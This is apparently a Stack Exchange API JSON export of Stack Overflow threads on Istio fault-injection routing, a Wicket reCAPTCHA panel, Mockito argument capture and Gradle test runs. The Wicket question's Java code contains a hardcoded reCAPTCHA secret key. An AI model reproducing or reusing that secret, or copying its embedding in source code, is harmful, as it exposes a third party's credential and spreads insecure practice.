using?"},{"owner":{"account_id":455809,"reputation":12993,"user_id":854207,"accept_rate":62,"display_name":"paul"},"score":0,"creation_date":1642066661,"post_id":70654441,"comment_id":124974892,"body_markdown":"networking.istio.io/v1beta1","body":"networking.istio.io/v1beta1"},{"owner":{"account_id":22142085,"reputation":2950,"user_id":16391991,"display_name":"Mikolaj S."},"score":0,"creation_date":1642496418,"post_id":70654441,"comment_id":125079466,"body_markdown":"Please check my answer with the newest edit.","body":"Please check my answer with the newest edit."},{"owner":{"account_id":455809,"reputation":12993,"user_id":854207,"accept_rate":62,"display_name":"paul"},"score":0,"creation_date":1642584371,"post_id":70654441,"comment_id":125106792,"body_markdown":"Thanks, but it seems is not working for gRPC communication","body":"Thanks, but it seems is not working for gRPC communication"},{"owner":{"account_id":22142085,"reputation":2950,"user_id":16391991,"display_name":"Mikolaj S."},"score":0,"creation_date":1642759612,"post_id":70654441,"comment_id":125162751,"body_markdown":"Please provide logs from Istio ingress gateway (get pod name with command `kubectl get pods -n istio-system` and then `kubectl logs istio-ingressgateway-{some-random-strings} -n istio-system`). Please provide more information about your setup (Istio and Kubernetes versions, the deployment / vitrual services / gateways etc config file) and [make your issue reproducible](https://stackoverflow.com/help/minimal-reproducible-example).","body":"Please provide logs from Istio ingress gateway (get pod name with command <code>kubectl get pods -n istio-system</code> and then <code>kubectl logs istio-ingressgateway-{some-random-strings} -n istio-system</code>). Please provide more information about your setup (Istio and Kubernetes versions, the deployment / vitrual services / gateways etc config file) and <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">make your issue reproducible</a>."}],"answers":[{"tags":[],"owner":{"account_id":22142085,"reputation":2950,"user_id":16391991,"display_name":"Mikolaj S."},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642496398,"creation_date":1641926610,"answer_id":70671917,"question_id":70654441,"body_markdown":"The `RouteRule` (used in the second link you sent) is [deprecated and replaced by `VirtualService`](https://istio.io/latest/blog/2018/v1alpha3-routing/):\r\n&gt;`VirtualService`, `DestinationRule`, and `ServiceEntry` replace `RouteRule`, `DestinationPolicy`, and `EgressRule` respectively.\r\n \r\nGood instructions on how to configure an HTTP delay fault is presented in this -&gt; [Fault Injection](https://istio.io/latest/docs/tasks/traffic-management/fault-injection/) documentation.\r\n \r\n Example YAML config for your header (`request-type:chaos`) based on [Ingress Gateways](https://istio.io/latest/docs/tasks/traffic-management/ingress/ingress-control/) and [Fault Injection](https://istio.io/latest/docs/tasks/traffic-management/fault-injection/) documentations:\r\n ```yaml\r\napiVersion: networking.istio.io/v1alpha3\r\nkind: VirtualService\r\nmetadata:\r\n  name: httpbin\r\nspec:\r\n  hosts:\r\n  - &quot;httpbin.example.com&quot;\r\n  gateways:\r\n  - httpbin-gateway\r\n  http:\r\n  - fault:\r\n      delay:\r\n        fixedDelay: 7s\r\n        percent: 100\r\n    match:\r\n    - headers:\r\n        request-type:\r\n          exact: chaos\r\n    route:\r\n    - destination:\r\n        port:\r\n          number: 80\r\n        host: my-echo-service\r\n  - route:\r\n    - destination:\r\n        port:\r\n          number: 80\r\n        host: my-nginx-service\r\n ```\r\n\r\n**EDIT:** Should work as well for `apiVersion: networking.istio.io/v1beta1`.","title":"Istio routing to chaos testing","body":"<p>The <code>RouteRule</code> (used in the second link you sent) is <a href=\"https://istio.io/latest/blog/2018/v1alpha3-routing/\" rel=\"nofollow noreferrer\">deprecated and replaced by <code>VirtualService</code></a>:</p>\n<blockquote>\n<p><code>VirtualService</code>, <code>DestinationRule</code>, and <code>ServiceEntry</code> replace <code>RouteRule</code>, <code>DestinationPolicy</code>, and <code>EgressRule</code> respectively.</p>\n</blockquote>\n<p>Good instructions on how to configure an HTTP delay fault is presented in this -&gt; <a href=\"https://istio.io/latest/docs/tasks/traffic-management/fault-injection/\" rel=\"nofollow noreferrer\">Fault Injection</a> documentation.</p>\n<p>Example YAML config for your header (<code>request-type:chaos</code>) based on <a href=\"https://istio.io/latest/docs/tasks/traffic-management/ingress/ingress-control/\" rel=\"nofollow noreferrer\">Ingress Gateways</a> and <a href=\"https://istio.io/latest/docs/tasks/traffic-management/fault-injection/\" rel=\"nofollow noreferrer\">Fault Injection</a> documentations:</p>\n<pre class=\"lang-yaml prettyprint-override\"><code>apiVersion: networking.istio.io/v1alpha3\nkind: VirtualService\nmetadata:\n name: httpbin\nspec:\n hosts:\n - &quot;httpbin.example.com&quot;\n gateways:\n - httpbin-gateway\n http:\n - fault:\n     delay:\n       fixedDelay: 7s\n       percent: 100\n   match:\n   - headers:\n       request-type:\n         exact: chaos\n   route:\n   - destination:\n       port:\n         number: 80\n       host: my-echo-service\n - route:\n   - destination:\n       port:\n         number: 80\n       host: my-nginx-service\n</code></pre>\n<p><strong>EDIT:</strong> Should work as well for <code>apiVersion: networking.istio.io/v1beta1</code>.</p>\n"}],"owner":{"account_id":455809,"reputation":12993,"user_id":854207,"accept_rate":62,"display_name":"paul"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":156,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1642496398,"creation_date":1641826890,"question_id":70654441,"body_markdown":"I&#39;m reading [traffic management documentation](https://istio.io/latest/docs/concepts/traffic-management/) and also use Istio for [chaos testing](https://developers.redhat.com/blog/2018/04/10/istio-chaos-engineering#never_gonna_give_you_up).\r\n\r\nI know we can use some headers value to routing traffic for AB testing, but what I would like to know is if I can do the same to return an error in one service or make a delay, as the Istio chaos testing provides.\r\n\r\nSo I can end up making request with header `request-type:chaos`, and for those we will apply the chaos testing YAML config, but not for the rest of request.","title":"Istio routing to chaos testing","body":"<p>I'm reading <a href=\"https://istio.io/latest/docs/concepts/traffic-management/\" rel=\"nofollow noreferrer\">traffic management documentation</a> and also use Istio for <a href=\"https://developers.redhat.com/blog/2018/04/10/istio-chaos-engineering#never_gonna_give_you_up\" rel=\"nofollow noreferrer\">chaos testing</a>.</p>\n<p>I know we can use some headers value to routing traffic for AB testing, but what I would like to know is if I can do the same to return an error in one service or make a delay, as the Istio chaos testing provides.</p>\n<p>So I can end up making request with header <code>request-type:chaos</code>, and for those we will apply the chaos testing YAML config, but not for the rest of request.</p>\n"},{"tags":["java","wicket"],"comments":[{"owner":{"account_id":232499,"reputation":17233,"user_id":497381,"display_name":"martin-g"},"score":0,"creation_date":1642489923,"post_id":70748880,"comment_id":125077125,"body_markdown":"Who is calling `#isCaptchaValid()` method ? Is it called in a normal or Ajax request ?","body":"Who is calling <code>#isCaptchaValid()</code> method ? Is it called in a normal or Ajax request ?"},{"owner":{"account_id":19299905,"reputation":49,"user_id":14108070,"display_name":"ali"},"score":0,"creation_date":1642496091,"post_id":70748880,"comment_id":125079335,"body_markdown":"Nothing is calling it yet, that is my question how I can implement a validator to check the button if it is checked or not , and raise a message to the user if he did not check the captcha button @martin-g","body":"Nothing is calling it yet, that is my question how I can implement a validator to check the button if it is checked or not , and raise a message to the user if he did not check the captcha button @martin-g"}],"owner":{"account_id":19299905,"reputation":49,"user_id":14108070,"display_name":"ali"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":129,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1642496252,"creation_date":1642464291,"question_id":70748880,"body_markdown":"I have an apache wicket panel for google recaptcha where I integrate wicket with google recaptcha and everything is working as it should, but I need to add an error message or feedbackpanel I am not quite good with wicket, so please advise me what is the best solution for my case? \r\n\r\n\r\n\r\n        \r\n    public class ReCaptchaPanel extends Panel {\r\n        private static final long serialVersionUID = -8346261172610929107L;\r\n    \r\n        private static final Logger log = LoggerFactory.getLogger(ReCaptchaPanel.class);\r\n    \r\n        final String publicKey = &quot;6LdrIgceAAAAADWF-gIz_OHJg_5gLu7IVw11hTnt&quot;;\r\n        final String secretKey = &quot;6LdrIgceAAAAAE9qxHViBj3Sl8uyqUVdluugPRTq&quot;;\r\n        final String scriptClassName = &quot;data-sitekey&quot;;\r\n        final String recCaptchaClassName = &quot;g-recaptcha&quot;;\r\n        String currentLanguage = getLocale().getLanguage();\r\n    String scriptValue = &quot;https://www.google.com/recaptcha/api.js?hl=&quot; + currentLanguage;\r\n\r\n    /* in the following link you can find the language codes\r\n     * https://developers.google.com/recaptcha/docs/language\r\n     * */\r\n\r\n\r\n    public ReCaptchaPanel(String id) {\r\n        super(id);\r\n        final IFeedbackMessageFilter feedbackFilter = new ContainerFeedbackMessageFilter(this);\r\n        final FeedbackPanel feedbackPanel = new FeedbackPanel(&quot;feedback&quot;, feedbackFilter);\r\n        feedbackPanel.setOutputMarkupId(true);\r\n        add(feedbackPanel);\r\n        add(new Label(&quot;reCaptchaComponent&quot;, &quot;&quot;).add(new SimpleAttributeModifier(&quot;class&quot;, recCaptchaClassName))\r\n                .add(new SimpleAttributeModifier(scriptClassName, publicKey)));\r\n        add(new Label(&quot;reCaptchaScript&quot;, &quot;&quot;).add(new SimpleAttributeModifier(&quot;src&quot;, scriptValue)));\r\n\r\n    }\r\n\r\n\r\n    public ReCaptchaPanel(String id, IModel model) {\r\n        super(id, model);\r\n    }\r\n\r\n\r\n    /**\r\n     * Validates Google reCAPTCHA V2 .\r\n     *\r\n     * @param secretKey Secret key (key given for communication between arena and Google)\r\n     * @param response  reCAPTCHA response from client side (g-recaptcha-response).\r\n     * @return true if validation successful, false otherwise.\r\n     */\r\n\r\n    public synchronized boolean isCaptchaValid(String secretKey, String response) {\r\n        try {\r\n            String url = &quot;https://www.google.com/recaptcha/api/siteverify&quot;,\r\n                    params = &quot;secret=&quot; + secretKey + &quot;&amp;response=&quot; + response;\r\n\r\n            HttpURLConnection http = (HttpURLConnection) new URL(url).openConnection();\r\n            http.setDoOutput(true);\r\n            http.setRequestMethod(&quot;POST&quot;);\r\n            http.setRequestProperty(&quot;Content-Type&quot;,\r\n                    &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;);\r\n            OutputStream out = http.getOutputStream();\r\n            out.write(params.getBytes(StandardCharsets.UTF_8));\r\n            out.flush();\r\n            out.close();\r\n\r\n            InputStream res = http.getInputStream();\r\n            BufferedReader rd = new BufferedReader(new InputStreamReader(res, StandardCharsets.UTF_8));\r\n\r\n            StringBuilder sb = new StringBuilder();\r\n            int cp;\r\n            while ((cp = rd.read()) != -1) {\r\n                sb.append((char) cp);\r\n            }\r\n            JSONObject json = new JSONObject(sb.toString());\r\n            res.close();\r\n            log.info(&quot;Google ReCaptcha has been verified&quot;);\r\n            return json.getBoolean(&quot;success&quot;);\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        log.error(&quot; Google ReCaptcha failed&quot;);\r\n        return false;\r\n    }\r\n\r\n    public synchronized boolean isCaptchaValid() {\r\n        HttpServletRequest httpServletRequest = ApplicationBase.getHttpServletRequest();\r\n        assert httpServletRequest != null;\r\n        String response = httpServletRequest.getParameter(&quot;g-recaptcha-\r\n\r\n    response&quot;);\r\n            return isCaptchaValid(secretKey, response);\r\n        }\r\n    \r\n    }\r\n\r\n\r\n\r\n\r\n\r\nI use this panel in another wicket component ( form) , \r\n\r\n      class FormEmail extends Form { \r\n       .........\r\n\r\n\r\n              final ReCaptchaPanel reCaptchaPanel = new ReCaptchaPanel(&quot;reCaptchaPanel&quot;) {\r\n                /**\r\n                 * @see org.apache.wicket.Component#isVisible()\r\n                 */\r\n                @Override\r\n                public boolean isVisible() {\r\n                    SessionBase session = (SessionBase) getSession();\r\n                    ItemListPanelConfigParams configParams = new ItemListPanelConfigParams(session);\r\n                    return configParams.isShowCaptcha();\r\n                }\r\n            };\r\n\r\n            add(reCaptchaPanel);\r\n\r\n            Button buttonSend = new Button(&quot;buttonSend&quot;) {\r\n                @Override\r\n                public void onSubmit() {\r\n                    onSendCallback(emailRecipient, emailReplyTo, comment);\r\n                    setResponsePage(callbackPage);\r\n                }\r\n            };\r\n\r\n\r\n\r\n\r\nwhat i need to achieve is that add a message when the verify method in code above is false; I mean an error message, anyone knows how. \r\n\r\n ","title":"add an error message to panel in apache wicket","body":"<p>I have an apache wicket panel for google recaptcha where I integrate wicket with google recaptcha and everything is working as it should, but I need to add an error message or feedbackpanel I am not quite good with wicket, so please advise me what is the best solution for my case?</p>\n<pre><code>public class ReCaptchaPanel extends Panel {\n    private static final long serialVersionUID = -8346261172610929107L;\n\n    private static final Logger log = LoggerFactory.getLogger(ReCaptchaPanel.class);\n\n    final String publicKey = &quot;6LdrIgceAAAAADWF-gIz_OHJg_5gLu7IVw11hTnt&quot;;\n    final String secretKey = &quot;6LdrIgceAAAAAE9qxHViBj3Sl8uyqUVdluugPRTq&quot;;\n    final String scriptClassName = &quot;data-sitekey&quot;;\n    final String recCaptchaClassName = &quot;g-recaptcha&quot;;\n    String currentLanguage = getLocale().getLanguage();\nString scriptValue = &quot;https://www.google.com/recaptcha/api.js?hl=&quot; + currentLanguage;\n\n/* in the following link you can find the language codes\n * https://developers.google.com/recaptcha/docs/language\n * */\n\n\npublic ReCaptchaPanel(String id) {\n    super(id);\n    final IFeedbackMessageFilter feedbackFilter = new ContainerFeedbackMessageFilter(this);\n    final FeedbackPanel feedbackPanel = new FeedbackPanel(&quot;feedback&quot;, feedbackFilter);\n    feedbackPanel.setOutputMarkupId(true);\n    add(feedbackPanel);\n    add(new Label(&quot;reCaptchaComponent&quot;, &quot;&quot;).add(new SimpleAttributeModifier(&quot;class&quot;, recCaptchaClassName))\n            .add(new SimpleAttributeModifier(scriptClassName, publicKey)));\n    add(new Label(&quot;reCaptchaScript&quot;, &quot;&quot;).add(new SimpleAttributeModifier(&quot;src&quot;, scriptValue)));\n\n}\n\n\npublic ReCaptchaPanel(String id, IModel model) {\n    super(id, model);\n}\n\n\n/**\n * Validates Google reCAPTCHA V2 .\n *\n * @param secretKey Secret key (key given for communication between arena and Google)\n * @param response  reCAPTCHA response from client side (g-recaptcha-response).\n * @return true if validation successful, false otherwise.\n */\n\npublic synchronized boolean isCaptchaValid(String secretKey, String response) {\n    try {\n        String url = &quot;https://www.google.com/recaptcha/api/siteverify&quot;,\n                params = &quot;secret=&quot; + secretKey + &quot;&amp;response=&quot; + response;\n\n        HttpURLConnection http = (HttpURLConnection) new URL(url).openConnection();\n        http.setDoOutput(true);\n        http.setRequestMethod(&quot;POST&quot;);\n        http.setRequestProperty(&quot;Content-Type&quot;,\n                &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;);\n        OutputStream out = http.getOutputStream();\n        out.write(params.getBytes(StandardCharsets.UTF_8));\n        out.flush();\n        out.close();\n\n        InputStream res = http.getInputStream();\n        BufferedReader rd = new BufferedReader(new InputStreamReader(res, StandardCharsets.UTF_8));\n\n        StringBuilder sb = new StringBuilder();\n        int cp;\n        while ((cp = rd.read()) != -1) {\n            sb.append((char) cp);\n        }\n        JSONObject json = new JSONObject(sb.toString());\n        res.close();\n        log.info(&quot;Google ReCaptcha has been verified&quot;);\n        return json.getBoolean(&quot;success&quot;);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n    log.error(&quot; Google ReCaptcha failed&quot;);\n    return false;\n}\n\npublic synchronized boolean isCaptchaValid() {\n    HttpServletRequest httpServletRequest = ApplicationBase.getHttpServletRequest();\n    assert httpServletRequest != null;\n    String response = httpServletRequest.getParameter(&quot;g-recaptcha-\n\nresponse&quot;);\n        return isCaptchaValid(secretKey, response);\n    }\n\n}\n</code></pre>\n<p>I use this panel in another wicket component ( form) ,</p>\n<pre><code>  class FormEmail extends Form { \n   .........\n\n\n          final ReCaptchaPanel reCaptchaPanel = new ReCaptchaPanel(&quot;reCaptchaPanel&quot;) {\n            /**\n             * @see org.apache.wicket.Component#isVisible()\n             */\n            @Override\n            public boolean isVisible() {\n                SessionBase session = (SessionBase) getSession();\n                ItemListPanelConfigParams configParams = new ItemListPanelConfigParams(session);\n                return configParams.isShowCaptcha();\n            }\n        };\n\n        add(reCaptchaPanel);\n\n        Button buttonSend = new Button(&quot;buttonSend&quot;) {\n            @Override\n            public void onSubmit() {\n                onSendCallback(emailRecipient, emailReplyTo, comment);\n                setResponsePage(callbackPage);\n            }\n        };\n</code></pre>\n<p>what i need to achieve is that add a message when the verify method in code above is false; I mean an error message, anyone knows how.</p>\n"},{"tags":["java","unit-testing","testing","junit","mockito"],"comments":[{"owner":{"account_id":2505472,"reputation":2664,"user_id":2179336,"display_name":"Dhawal Kapil"},"score":0,"creation_date":1642182856,"post_id":70714648,"comment_id":125011583,"body_markdown":"If you are mocking the `MenuRepository` then you are in control of what the `save` method should return, you can specify the return i.e. `saved` parameter your self using the `when-then` statements","body":"If you are mocking the <code>MenuRepository</code> then you are in control of what the <code>save</code> method should return, you can specify the return i.e. <code>saved</code> parameter your self using the <code>when-then</code> statements"},{"owner":{"display_name":"user17862362"},"score":0,"creation_date":1642183043,"post_id":70714648,"comment_id":125011667,"body_markdown":"What do you mean, could you post the example code? on the other hand, if I follow that approach, I would give the saved object&#39;s value, but in this scene how can I test it?","body":"What do you mean, could you post the example code? on the other hand, if I follow that approach, I would give the saved object&#39;s value, but in this scene how can I test it?"},{"owner":{"account_id":2505472,"reputation":2664,"user_id":2179336,"display_name":"Dhawal Kapil"},"score":0,"creation_date":1642183300,"post_id":70714648,"comment_id":125011765,"body_markdown":"Usually, when you write a unit test, you mock all the dependencies. For instance, for `MenuServiceImpl` for which we are writing test, `MenuRepository` should be mocked, then only we will be able to test the functioning of `MenuServiceImpl` in isolation. Also, you don&#39;t need to test if `MenuRepository` is working correctly in the test of `MenuServiceImpl`, for that you can write another test for `MenuRepository` to test its working. If at all you have to test through layers and use a combination of mocks and actual class invocation, you can use @Spy annotation.","body":"Usually, when you write a unit test, you mock all the dependencies. For instance, for <code>MenuServiceImpl</code> for which we are writing test, <code>MenuRepository</code> should be mocked, then only we will be able to test the functioning of <code>MenuServiceImpl</code> in isolation. Also, you don&#39;t need to test if <code>MenuRepository</code> is working correctly in the test of <code>MenuServiceImpl</code>, for that you can write another test for <code>MenuRepository</code> to test its working. If at all you have to test through layers and use a combination of mocks and actual class invocation, you can use @Spy annotation."},{"owner":{"display_name":"user17862362"},"score":0,"creation_date":1642183654,"post_id":70714648,"comment_id":125011897,"body_markdown":"I already mock all the necessary repo and services that I used to test methods. However, I what you mean is a little bit confused. Could you simply post an example test for this `update` method just by modifying my test in the question?","body":"I already mock all the necessary repo and services that I used to test methods. However, I what you mean is a little bit confused. Could you simply post an example test for this <code>update</code> method just by modifying my test in the question?"},{"owner":{"display_name":"user17862362"},"score":0,"creation_date":1642183911,"post_id":70714648,"comment_id":125011985,"body_markdown":"I set the updated fields in `request` parameter and need to check if the saved parameter&#39;s field is updated or not. So, I need a different thing rather than mocking I think. Any idea?","body":"I set the updated fields in <code>request</code> parameter and need to check if the saved parameter&#39;s field is updated or not. So, I need a different thing rather than mocking I think. Any idea?"}],"answers":[{"tags":[],"owner":{"account_id":2350759,"reputation":789,"user_id":2514268,"display_name":"Kartal Tabak"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642190484,"creation_date":1642190484,"answer_id":70715965,"question_id":70714648,"body_markdown":"If that is a unit test, then I assume you already mock `MenuRepository`. \r\n\r\nTo properly mock `MenuRepository`, you need to define the behavior of `menuRepository.findByUuid(request.getUuid())` and `menuRepository.save(menu)`. \r\n\r\nOnce you define `menuRepository.findByUuid(request.getUuid())`, you need to create a `Menu` instance. All you need to do is, to check if the fields of that `menu` are updated properly. ","title":"How to capture saved value in Java?","body":"<p>If that is a unit test, then I assume you already mock <code>MenuRepository</code>.</p>\n<p>To properly mock <code>MenuRepository</code>, you need to define the behavior of <code>menuRepository.findByUuid(request.getUuid())</code> and <code>menuRepository.save(menu)</code>.</p>\n<p>Once you define <code>menuRepository.findByUuid(request.getUuid())</code>, you need to create a <code>Menu</code> instance. All you need to do is, to check if the fields of that <code>menu</code> are updated properly.</p>\n"},{"tags":[],"owner":{"account_id":2505472,"reputation":2664,"user_id":2179336,"display_name":"Dhawal Kapil"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642496207,"creation_date":1642269506,"answer_id":70723970,"question_id":70714648,"body_markdown":"Let&#39;s try to break down the functionality of the `MenuServiceImpl`&#39;s `update` method:\r\n````\r\npublic CommandDTO update(final MenuRequest request) {\r\n    Menu menu = menuRepository.findByUuid(request.getUuid());\r\n\r\n    MenuConverter.convert(request, menu); // map fields\r\n    Menu saved = menuRepository.save(menu);\r\n    return CommandDTO.builder()\r\n        .uuid(saved.getUuid())\r\n        .build();\r\n}\r\n````\r\nHere is what this method is doing:\r\n1. Fetching existing `Menu` from the repository, finding by `uuid`\r\n2. Converting it i.e. updating it from `request`\r\n3. Persisting it back in repository using `save`\r\n4. Creating a `CommandDTO` from saved uuid.\r\n\r\nNow, when we write *UnitTest* for a unit then that means we are testing the working of that unit only.\r\nHere `MenuServiceImpl` is not responsible to ensure whether the values were mapped correctly or if the updated value was saved correctly, the only work `MenuServiceImpl` performs is to call these dependencies in a particular order and that is all we need to test here.\r\nSo, here is a correct test for `MenuServiceImpl`&#39;s `update` method:\r\n\r\n````\r\n@Test\r\nvoid test_Update() {\r\n\r\n    MenuRequest request = new MenuRequest(&quot;1234&quot;);\r\n\r\n    Menu existingMockMenu = mock(Menu.class);\r\n    when(menuRepository.findByUuid(&quot;1234&quot;)).thenReturn(existingMockMenu);\r\n\r\n    Menu savedMockMenu = mock(Menu.class);\r\n    when(menuRepository.save(existingMockMenu)).thenReturn(savedMockMenu);\r\n\r\n    menuServiceImpl.update(request);\r\n\r\n    verify(menuRepository).save(existingMockMenu);\r\n}\r\n````\r\n\r\nIf at all you want to test if `MenuRepository` is saving the `Menu` correctly, you will have to write a new test for `MenuRepository`, if this is actually a repository that interacts with the database, then it will be helpful to write DB Integration Test.\r\n\r\nRegarding using `ArgumentCaptor`, let&#39;s suppose your `MenuConverter` is changing the values of the `menu`, something like this:\r\n\r\n````\r\npublic class MenuConverter {\r\n\r\n    public static void convert(MenuRequest request, Menu menu) {\r\n        menu.setName(request.getName() + &quot;_new&quot;);\r\n    }\r\n\r\n}\r\n````\r\n\r\nthen first of all, you should have a different test for `MenuConverter` that tests this logic, still if you want to test this in the test of `MenuServiceImpl` itself, then you don&#39;t have to use `ArgumentCaptor`, you can use something like:\r\n\r\n````\r\n@Test\r\nvoid test_Update() {\r\n\r\n// same as above\r\n\r\n  verify(existingMockMenu).setName(&quot;Menu1_new&quot;);\r\n}\r\n````\r\n\r\nThis verifies that `MenuConverter` attempted to update the name of your `existingMockMenu`\r\n","title":"How to capture saved value in Java?","body":"<p>Let's try to break down the functionality of the <code>MenuServiceImpl</code>'s <code>update</code> method:</p>\n<pre><code>public CommandDTO update(final MenuRequest request) {\n    Menu menu = menuRepository.findByUuid(request.getUuid());\n\n    MenuConverter.convert(request, menu); // map fields\n    Menu saved = menuRepository.save(menu);\n    return CommandDTO.builder()\n        .uuid(saved.getUuid())\n        .build();\n}\n</code></pre>\n<p>Here is what this method is doing:</p>\n<ol>\n<li>Fetching existing <code>Menu</code> from the repository, finding by <code>uuid</code></li>\n<li>Converting it i.e. updating it from <code>request</code></li>\n<li>Persisting it back in repository using <code>save</code></li>\n<li>Creating a <code>CommandDTO</code> from saved uuid.</li>\n</ol>\n<p>Now, when we write <em>UnitTest</em> for a unit then that means we are testing the working of that unit only.\nHere <code>MenuServiceImpl</code> is not responsible to ensure whether the values were mapped correctly or if the updated value was saved correctly, the only work <code>MenuServiceImpl</code> performs is to call these dependencies in a particular order and that is all we need to test here.\nSo, here is a correct test for <code>MenuServiceImpl</code>'s <code>update</code> method:</p>\n<pre><code>@Test\nvoid test_Update() {\n\n    MenuRequest request = new MenuRequest(&quot;1234&quot;);\n\n    Menu existingMockMenu = mock(Menu.class);\n    when(menuRepository.findByUuid(&quot;1234&quot;)).thenReturn(existingMockMenu);\n\n    Menu savedMockMenu = mock(Menu.class);\n    when(menuRepository.save(existingMockMenu)).thenReturn(savedMockMenu);\n\n    menuServiceImpl.update(request);\n\n    verify(menuRepository).save(existingMockMenu);\n}\n</code></pre>\n<p>If at all you want to test if <code>MenuRepository</code> is saving the <code>Menu</code> correctly, you will have to write a new test for <code>MenuRepository</code>, if this is actually a repository that interacts with the database, then it will be helpful to write DB Integration Test.</p>\n<p>Regarding using <code>ArgumentCaptor</code>, let's suppose your <code>MenuConverter</code> is changing the values of the <code>menu</code>, something like this:</p>\n<pre><code>public class MenuConverter {\n\n    public static void convert(MenuRequest request, Menu menu) {\n        menu.setName(request.getName() + &quot;_new&quot;);\n    }\n\n}\n</code></pre>\n<p>then first of all, you should have a different test for <code>MenuConverter</code> that tests this logic, still if you want to test this in the test of <code>MenuServiceImpl</code> itself, then you don't have to use <code>ArgumentCaptor</code>, you can use something like:</p>\n<pre><code>@Test\nvoid test_Update() {\n\n// same as above\n\n  verify(existingMockMenu).setName(&quot;Menu1_new&quot;);\n}\n</code></pre>\n<p>This verifies that <code>MenuConverter</code> attempted to update the name of your <code>existingMockMenu</code></p>\n"}],"owner":{"display_name":"user17862362"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":720,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":2,"score":-1,"last_activity_date":1642496207,"creation_date":1642182565,"question_id":70714648,"body_markdown":"I am trying to create a unit test for the following method:\r\n\r\n```\r\npublic CommandDTO update(final MenuRequest request) {\r\n    Menu menu = menuRepository.findByUuid(request.getUuid());\r\n\r\n    MenuConverter.convert(request, menu); // map fields\r\n    Menu saved = menuRepository.save(menu);\r\n    return CommandDTO.builder().uuid(saved.getUuid()).build();\r\n}\r\n```\r\n\r\nI want to capture `saved` parameter as it is not returned from the method using the following unit test:\r\n\r\n\r\n```\r\n@RunWith(MockitoJUnitRunner.class)\r\npublic class MenuServiceImplTest {\r\n\r\n    @InjectMocks\r\n    private MenuServiceImpl menuService;\r\n\r\n    @Captor\r\n    private ArgumentCaptor&lt;Menu&gt; menuCaptor;\r\n\r\n    // mocks (code omitted for brevity)\r\n\r\n    @Test\r\n    public void test_Update() {\r\n\r\n        // ...\r\n\r\n        CommandDTO result = menuService.update(request);\r\n\r\n        verify(menuRepository).save(menuCaptor.capture());\r\n        final Menu captured = menuCaptor.getValue();\r\n    }\r\n}\r\n```\r\n\r\nHowever, the parameter in `menuRepository.save()` is the unsaved parameter, but I need to capture `saved` parameter. So, how can I do this? Should I use `@Spy` instead of `ArgumentCaptor`? ","title":"How to capture saved value in Java?","body":"<p>I am trying to create a unit test for the following method:</p>\n<pre><code>public CommandDTO update(final MenuRequest request) {\n    Menu menu = menuRepository.findByUuid(request.getUuid());\n\n    MenuConverter.convert(request, menu); // map fields\n    Menu saved = menuRepository.save(menu);\n    return CommandDTO.builder().uuid(saved.getUuid()).build();\n}\n</code></pre>\n<p>I want to capture <code>saved</code> parameter as it is not returned from the method using the following unit test:</p>\n<pre><code>@RunWith(MockitoJUnitRunner.class)\npublic class MenuServiceImplTest {\n\n    @InjectMocks\n    private MenuServiceImpl menuService;\n\n    @Captor\n    private ArgumentCaptor&lt;Menu&gt; menuCaptor;\n\n    // mocks (code omitted for brevity)\n\n    @Test\n    public void test_Update() {\n\n        // ...\n\n        CommandDTO result = menuService.update(request);\n\n        verify(menuRepository).save(menuCaptor.capture());\n        final Menu captured = menuCaptor.getValue();\n    }\n}\n</code></pre>\n<p>However, the parameter in <code>menuRepository.save()</code> is the unsaved parameter, but I need to capture <code>saved</code> parameter. So, how can I do this? Should I use <code>@Spy</code> instead of <code>ArgumentCaptor</code>?</p>\n"},{"tags":["java","gradle"],"answers":[{"tags":[],"owner":{"account_id":1948424,"reputation":12649,"user_id":1753073,"display_name":"navylover"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642485300,"creation_date":1642485300,"answer_id":70750896,"question_id":70750620,"body_markdown":"Press Alt + F12 to open the terminal, and execute the command like the following:\r\n\r\n    gradlew :indexing:signals:user:test","title":"Gradle only run test","body":"<p>Press Alt + F12 to open the terminal, and execute the command like the following:</p>\n<pre><code>gradlew :indexing:signals:user:test\n</code></pre>\n"},{"tags":[],"owner":{"account_id":23858103,"reputation":1,"user_id":17861397,"display_name":"sambuca"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642496022,"creation_date":1642496022,"answer_id":70752736,"question_id":70750620,"body_markdown":"You can make gradle skip dependency checking by using the `--offline` parameter.","title":"Gradle only run test","body":"<p>You can make gradle skip dependency checking by using the <code>--offline</code> parameter.</p>\n"}],"owner":{"account_id":1324076,"reputation":717,"user_id":1269298,"accept_rate":52,"display_name":"user1269298"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":142,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1642496022,"creation_date":1642483265,"question_id":70750620,"body_markdown":"I am new to gradle+java. I a use Intellij to debug a sophisticated unit test case on an algorithm. The problem is every time after I click the &#39;debug&#39; button, it takes long time (~2min) to start my test case, and from the log as following, it seems gradle is checking dependencies first and there are hundreds of them. Since most of the time I just re-trigger the debugger with no or very little change(no dependency related) to test code. How can I skip the dependency checking and only build the test file when there is a change? \r\n\r\n\r\n```\r\nParallel execution with configuration on demand is an incubating feature.\r\n&gt; Task :corporate:common:processResources NO-SOURCE\r\n...\r\nhundreds tasks\r\n...\r\n&gt; Task :indexing:signals:user:testClasses UP-TO-DATE\r\n&gt; Task :indexing:signals:user:test   &lt;= my test case there\r\n```\r\n\r\nThe Intellij debug 